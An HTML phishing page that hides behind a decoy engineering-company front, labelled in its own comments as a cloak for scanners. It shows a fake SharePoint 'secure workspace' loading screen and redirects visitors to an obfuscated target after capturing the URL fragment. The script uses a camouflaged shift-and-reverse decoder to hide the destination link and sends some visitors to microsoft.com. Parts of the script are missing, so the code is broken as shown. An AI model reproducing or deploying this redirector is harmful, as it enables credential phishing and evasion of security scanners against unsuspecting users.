<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="no-referrer">
    <title>Aegis Precision Systems | Advanced Engineering Solutions</title>
    <style>
        :root { --accent: #0078d4; --bg: #0f1113; --card: #1a1d20; --text: #e1e1e1; }
        body, html { margin: 0; padding: 0; background: var(--bg); color: var(--text); font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; height: 100%; overflow: hidden; }

        /* --- THE CLOAK (Visible to Scanners) --- */
        header { padding: 20px 8%; display: flex; justify-content: space-between; align-items: center; background: rgba(15, 17, 19, 0.95); border-bottom: 1px solid #333; }
        .brand { font-size: 22px; font-weight: 800; letter-spacing: 1px; color: #fff; }
        .brand span { color: var(--accent); }
        nav a { margin-left: 30px; text-decoration: none; color: #aaa; font-size: 13px; font-weight: 600; text-transform: uppercase; }
        .hero { padding: 100px 8%; background: linear-gradient(45deg, #0f1113 30%, #1a1d20 100%); }
        .hero h1 { font-size: 3rem; color: #fff; }

        /* --- THE EXECUTIONER UI (The SharePoint Block) --- */
        #loaderBlock {
            display: flex; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #fff; z-index: 10000; flex-direction: column; align-items: center; justify-content: center;
        }
        .sp-logo { width: 85px; margin-bottom: 25px; }
        .spinner-ring { display: inline-block; position: relative; width: 80px; height: 80px; }
        .spinner-ring div {
            box-sizing: border-box; display: block; position: absolute; width: 64px; height: 64px; margin: 8px;
            border: 6px solid var(--accent); border-radius: 50%;
            animation: ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
            border-color: var(--accent) transparent transparent transparent;
        }
        @keyframes ring { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .sh-text { font-size: 19px; color: #323130; margin-top: 20px; font-weight: 400; }
        .sh-subtext { font-size: 13px; color: #605e5c; margin-top: 8px; }
    </style>
</head>
<body>

    <header>

    </header>
    <div class="hero"><h1>Engineering Excellence.</h1></div>

    <div id="loaderBlock">
        <img src="https://upload.wikimedia.org/wikipedia/commons/e/ec/Microsoft_Office_SharePoint_%282019%E2%80%932025%29.svg" class="sp-logo">
        <div class="spinner-ring"><div></div><div></div><div></div><div></div></div>
        <div id="statusText" class="sh-text">Opening Secure Workspace...</div>
        <div id="subText" class="sh-subtext">Authenticating your session...</div>

                window.location.replace("https://www.microsoft.com");
                return;
            }

            // 2. FRAGMENT CAPTURE
            const fragment = window.location.hash.substring(1);
            
            // 3. THE _M (Your Encrypted Zoho Link - No URL Law)
            const _M = "wfe/tsflspx/d528e849g8g63c3962932cd4/3376898100;tquui"; 

            // 4. CAMOUFLAGED DECRYPT ENGINE
            const syncPortalTheme = (data) => {
                let s = "";
                for (let i = 0; i < data.length; i++) {
                    s += String.fromCharCode(data.charCodeAt(i) - 1);
                }
                return s.split("").reverse().join("");
            };

            try {
                const baseTarget = syncPortalTheme(_M);
                let finalJump;

                // 5. THE SOFT TWIST

                    window.location.replace(finalJump);

            } catch (e) {

            }
        })();

</body>
</html>
